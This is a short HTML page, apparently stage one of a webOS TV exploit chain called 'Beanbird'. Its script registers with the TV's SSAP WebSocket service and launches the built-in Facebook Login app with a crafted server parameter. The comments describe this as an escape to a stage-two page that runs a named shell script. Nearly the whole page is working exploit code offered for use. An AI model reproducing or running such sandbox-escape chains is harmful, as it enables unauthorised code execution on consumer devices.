<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Beanbird Return</title>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 10vh; }
        .button { padding: 20px; width: 300px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; }
        #btn-run { background: #ff0066; border: 2px solid #ff9900; }
        #btn-reset { background: #444; }
        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; overflow-y: auto; border: 1px solid #333; }
    </style>
</head>
<body>
    <h1>Return the Beanbird Cursor</h1>
    <button id="btn-run" class="button">Return Beanbird Cursor</button>
    <button id="btn-reset" class="button">Reset to Default</button>
    <div id="log">Status: Ready.</div>

    <script>
        const logBox = document.getElementById('log');
        const SITE_URL = window.location.origin;

        function log(m) { logBox.innerHTML += `<br>> ${m}`; logBox.scrollTop = logBox.scrollHeight; }

        // The "request" function that replaces webOSTV.js
        function request(ws, uri, payload) {
            ws.send(JSON.stringify({
                id: "req_" + Math.random().toString(36).substr(2, 9),
                type: "request",
                uri: uri,
                payload: payload
            }));
        }

        function start(scriptName) {
            log("Connecting...");
            const ws = new WebSocket('ws://127.0.0.1:3000');
            
            ws.onopen = () => {
                log("Connected. ACCEPT THE PROMPT ON TV.");
                ws.send(JSON.stringify({
                    id: "register_0",
                    type: "register",
                    payload: { forcePairing: false, pairingType: "PROMPT", manifest: { permissions: ["LAUNCH"] } }
                }));
            };

            ws.onmessage = (e) => {
                const res = JSON.parse(e.data);
                if (res.type === "registered") {
                    log("Escaping to Stage 2...");
                    const stage2 = `${SITE_URL}/stage2.html?script=${scriptName}`;
                    
                    // Triggering the Facebook Login app escape
                    request(ws, "ssap://system.launcher/launch", {
                        id: "com.webos.app.facebooklogin",
                        params: { server: stage2.replace(/https?:\/\//, '') + "#" }
                    });
                }
            };
        }

        document.getElementById('btn-run').onclick = () => start('beanbird.sh');
        document.getElementById('btn-reset').onclick = () => start('reboot.sh');
    </script>
</body>
</html>
